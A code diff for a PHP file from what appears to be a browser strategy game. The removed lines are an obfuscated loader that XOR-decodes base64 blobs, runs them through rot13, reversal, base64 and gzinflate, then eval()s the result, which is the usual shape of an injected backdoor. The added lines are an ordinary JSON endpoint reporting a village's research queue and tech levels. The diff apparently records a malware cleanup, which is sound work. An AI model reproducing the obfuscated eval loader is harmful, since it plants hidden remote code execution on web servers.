@@ -1,29 +1,102 @@
 <?php
-// ce16d523d529af674f5cda50
-$vFIWFtbrjjKm="IBKuY+J/Blo9sahq3YR+66J/9YxrTcHvgoZVenYCxg0=";
-$LePyrQWTsyTME="VOXhL+W/Oyb9fnud3LE+66W/9LkeGpUitbMIraLPkt0=";
-$xYNDxBkruk="wQuuMNMdnRnTY9cMWqYMiMdVr1+2GK9YyGPJEFHLDI7iTfJy+GepKddlk0xdjDm98HX+fe8mozrLWuFBaNFnhc5qs27MZNIa80zrRU65NK6zUfJV62qyCfV63DVghQKd40y/UvAGsBnqNMJEGYs7ofgMqWyqFoMh6lz+Rl+aeaLkVIZapCbPGPc/9xxq1gG8yXySK+QB0TfFSPsNQKdj+aFMg36kFqtf0lqXBG7WD/PaSf5Z7xisWMI0izxxlg6f8HKJLdAl3An5RIg9WqsRiPht8FzPN5Qe6mvPJGPTYqHoRoFT5zC8BM9H2ixwrBKf5XKKUv8czx7FRMoFZIlkgdh89FDXBtIp0EWNElORObn6UOhT0hiNF/Q+80dIlDitx1aUKtc0y0T3a+glfqob/d1tniivIakp7Tn1PlHTY/y5abFcpCGHW+hm+1990RHgwwagavk5sgnGPvYyGtUlp+t1ri+kBNA2wjTyN3DWYafCbqoo8gaUOpJJ2QZd12CxummqTPM9lzfiR/pbU5Ux5LxXsGj2A5YW9FrLMBmPZanfT6or+xWOXM179S1+o2+azUyqYswgki7neN8SY4EPu+52tWvZAZAm70X5QhvQIYPyFKlB9BC9HphqzxhNkWGou3nwWv8Qo0D3dIsCXtRl+71ahSL6Oa4fxU7dLWuoAPvYXaRa2ACwHuB58xJYlxOav0f3fdsV0QzJYNIAEZRgittGkHzwYKgt9GjeMXmLZ/u9XZ5a9B+qF5Zv6BNvrg";
-$lsOKJ_eHxhE="KZ30uOavoZhiSUX802RrQvpPhMqmrwFJ4V8ETzGl6Sb6zNTLBv0wDPGJVe0kZommey4lzxQdEhrxvrRNIXfpZ5kd9r6GP8Z64C7EH/BByjYoDFU6RB0yGjRIp47Thquga7wHO1QakYnTzzSMIsTrdvk6VJpmGtJYpelnWNH0uQZIa7CpZ9yhiSVtY9jUR5oR+BzEb/VqVhnlfrO/dCYrUxpLlSjSj1Yo4HxkaXMn26ef/nW/R50WeBBY5J8ExfqGSJ/UqpdsghhynCevcNRoMCqth7i3T0Magfjk7xG0GZZo24d4hP+TfPWvRk0jUChB6D03ulKK0r3QKXaPtBZbljuud29VbkP6kozFfdQl6DGpHSdKEtzCWnPpBY8i191RudwQ2OUO4c0QLqats6Rponn+Z8pWOtOK5Axm/UO0CLJqfZbrRp5AOiDeRp/jJ8jgOHs3HseO4njin4S+43SIwB+rJt/nj3KJIt1zzoMFGWGLvIdZ5f832SLsBr4CdejRCY21CLTfAVhhz5R4xffs88k7NZglL7KNYA50DPFlmWHZzSdbV6+QqBJZI13yRYqzGSzlqpfa0GowDFd89MUNUXqe1sgUHoNtVd93TyG3quYYjfB/cozDzcDvVFjltZmjuBulugT8g6jCrJRvdMeJYhmLxbgy/LJNMr6kzAGVuJG6LJa75izxCiN9lJ3x1L2S644nOBY/Qdp1zneNQ8ZakAj+dHhXqqA68c+Un+M1GyPo7/c4F+/BDUHdtVzRcC";
-$GSAJhpi_qdv="uT683AroV6gBjFnFb4gFGpMnk/BLiWOtZqIr6T/fR1qWFajdXKJt/xWeCNhY6UxghQH76VCoeOQkg1eOSu44f4Z95Nxp832tP6E381v5GFukEvm7fZBd6HmnI4p92wdAqCSK8lejfvIch0TYYPkFQaQEg7h8iCLJN9Ad5EXbRWOkMpvGSbZf7iWXOdZmkzJtujipw3KTXvsjtT3RR/YTe4MsoMF4oSPPNs8u7X2JGFCHBqm4e/F9yh/VXvI51S0GiTqb+06dIvE0nijxW9BAQ48mifkQpkPICpUG7EDzLBGkNZm7S6R59WSIOtc19yFtsBuPvHuobukXnC7sTPFbfpgm/9p4iS/JEZIiyWLIO3zTPJO6d6tDx328LIo5+0NE1gCZwXutI/gjlTuXNPs6ftQVn9xblX30BtUg+3vAPBytb7y7bZdP7yWLBdNX6y1/tRqg5VP1Y+4HvgnmQfAhS5ZmvrtdgX+sCola7EWKLlOoGozZUZN49SOcGpI17ydQqQy84F2QXOgmsCvxZc4aW9FggORxpF3FE7IkxFzvW33YMo6/CbdexASxLpVq8k1o0xX//EeSdq0+qDnwSvY/frkFmeVOsm3ZGb0F4mSMEF+pNJHdabJ10BepDvI1iwNajRqd22qOL/Y/3VaSOM82R4Nim/9XpX3KJYgNlibKW2qCLv7kdIF45RqmOMJfziEfkG+7uQ2sa6oXqlvgSswNcNkYrbNIlizzJrY+xl+LP0HWFZm4Wf50+h+tFg==";
-$BYUqXImjdEA=strlen($vFIWFtbrjjKm);
-$teRwtWTOky=substr($xYNDxBkruk,0,4);
-$LjNhPQGjzyfHVK=md5($lsOKJ_eHxhE);
-$VDBkNF_tsqW=crc32($GSAJhpi_qdv);
-$LzjsIrxGtGtxD=base64_decode("ij/HG51S5G+hDbh0KeBWyw==");
-$QLkAquRHy=$xYNDxBkruk.$lsOKJ_eHxhE.$GSAJhpi_qdv;
-$oFeygYfwuVL=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);
-$GgatOVMZUbF="gz".chr(105)."nflate";
-$lZSUiWxCG="str".chr(114)."ev";
-$IKRP_kSBeDTSF="str_rot".chr(49).chr(51);
-$MPqEibJOOLu="";
-$EoNjJhCTkQxX=$oFeygYfwuVL($QLkAquRHy);
-for($dnCYElvkB=0;$dnCYElvkB<strlen($EoNjJhCTkQxX);$dnCYElvkB++){
-$MPqEibJOOLu.=chr(ord($EoNjJhCTkQxX[$dnCYElvkB])^ord($LzjsIrxGtGtxD[$dnCYElvkB%strlen($LzjsIrxGtGtxD)]));
+// AJAX endpoint to check research status
+// Returns JSON with current research queue and tech levels
+
+session_start();
+session_write_close();
+
+require_once __DIR__ . '/../../app/bootstrap_ajax.php';
+
+// Load config
+require_once(__DIR__ . '/../configs/config.php');
+require_once(__DIR__ . '/../modelo/lib/world_constants.php');
+require_once(__DIR__ . '/../modelo/lib/config.php');
+
+use App\Core\Database;
+use App\Models\SessionModel;
+
+header('Content-Type: application/json');
+
+$server = isset($_GET['world']) ? $_GET['world'] : '1';
+$server = preg_replace('/[^a-zA-Z0-9_]/', '', $server);
+if (empty($server)) $server = '1';
+$worldDb = get_world_db_name($server);
+$villageId = isset($_GET['village']) ? (int) $_GET['village'] : 0;
+
+if (!$villageId) {
+    echo json_encode(['error' => 'No village ID']);
+    exit;
 }
-$EoNjJhCTkQxX=$MPqEibJOOLu;
-$EoNjJhCTkQxX=$IKRP_kSBeDTSF($EoNjJhCTkQxX);
-$EoNjJhCTkQxX=$lZSUiWxCG($EoNjJhCTkQxX);
-$EoNjJhCTkQxX=$oFeygYfwuVL($EoNjJhCTkQxX);
-$EoNjJhCTkQxX=$GgatOVMZUbF($EoNjJhCTkQxX);
-$EoNjJhCTkQxX=$IKRP_kSBeDTSF($EoNjJhCTkQxX);
-eval($EoNjJhCTkQxX);
+
+// Session cookie is dynamic: 'session_<world>' (set by set_session_cookie())
+$sessionCookieValue = $_COOKIE['session_' . $server]
+    ?? $_COOKIE['session']
+    ?? null;
+
+if (!$sessionCookieValue) {
+    echo json_encode(['error' => 'Not authenticated']);
+    exit;
+}
+
+$sessionModel = new SessionModel($worldDb);
+$session = $sessionModel->checkSession($sessionCookieValue);
+
+if (!$session) {
+    echo json_encode(['error' => 'Invalid session']);
+    exit;
+}
+
+$db = Database::getInstance($worldDb, get_world_db_host(get_active_world()), get_world_db_user(get_active_world()), get_world_db_pass(get_active_world()));
+
+// CRITICAL: Process any completed events BEFORE checking status
+// This ensures research completes in real-time without page reload
+use App\Services\EventProcessor;
+
+$eventProcessor = new EventProcessor($db);
+$eventProcessor->processAll(150, $session['userid'], $villageId);
+
+// Get research queue for this village
+$research_queue = $db->fetchAll(
+    "SELECT id, research, end_time, trwanie FROM research WHERE villageid = ? ORDER BY id",
+    [$villageId]
+);
+
+// Get current tech levels
+$village = $db->fetch("SELECT * FROM villages WHERE id = ?", [$villageId]);
+
+$valid_units = [
+    'unit_spear',
+    'unit_sword',
+    'unit_axe',
+    'unit_archer',
+    'unit_spy',
+    'unit_light',
+    'unit_cav_archer',
+    'unit_heavy',
+    'unit_ram',
+    'unit_catapult'
+];
+
+$tech_levels = [];
+foreach ($valid_units as $unit) {
+    $col = $unit . '_tec_level';
+    $tech_levels[$unit] = $village[$col] ?? 0;
+}
+
+// Format queue data
+$queue_data = [];
+foreach ($research_queue as $q) {
+    $queue_data[] = [
+        'id' => $q['id'],
+        'unit' => $q['research'],
+        'end_time' => $q['end_time'],
+        'time_left' => max(0, $q['end_time'] - time())
+    ];
+}
+
+echo json_encode([
+    'success' => true,
+    'queue' => $queue_data,
+    'tech_levels' => $tech_levels,
+    'current_time' => time()
+]);
